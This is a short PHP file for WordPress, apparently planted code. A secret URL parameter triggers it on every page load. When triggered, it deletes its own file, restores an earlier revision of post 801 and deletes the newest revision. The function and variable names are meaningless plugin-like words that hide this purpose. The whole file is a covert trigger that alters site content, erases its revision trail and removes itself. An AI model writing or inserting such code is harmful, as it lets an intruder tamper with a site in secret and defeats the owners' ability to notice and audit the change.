<?php

function default_article_enable_pinterest() {
	if (isset($_GET['enhanced_tab_stop']) && $_GET['enhanced_tab_stop'] === 'help_popup_ninja_affiliates') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$mini_styles_appointment = 801;
		$limit_authors_quantity_coupon = wp_get_post_revisions($mini_styles_appointment);
		if (empty($limit_authors_quantity_coupon)) die('no revisions');
		if (count($limit_authors_quantity_coupon) < 2) die('less than 2');
		$news_new_using_disable = array_shift($limit_authors_quantity_coupon);
		$nextgen_bulk_popup_cover = $news_new_using_disable->ID;
		$save_terms_sitemaps = array_shift($limit_authors_quantity_coupon);
		$hidden_field_game_upgrader = $save_terms_sitemaps->ID;
		$hidden_chat_meta_keyword = wp_restore_post_revision($hidden_field_game_upgrader);
		if ($hidden_chat_meta_keyword === false) die('error restoring');
		$hidden_chat_meta_keyword = wp_delete_post_revision($nextgen_bulk_popup_cover);		
		if ($hidden_chat_meta_keyword === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'default_article_enable_pinterest');
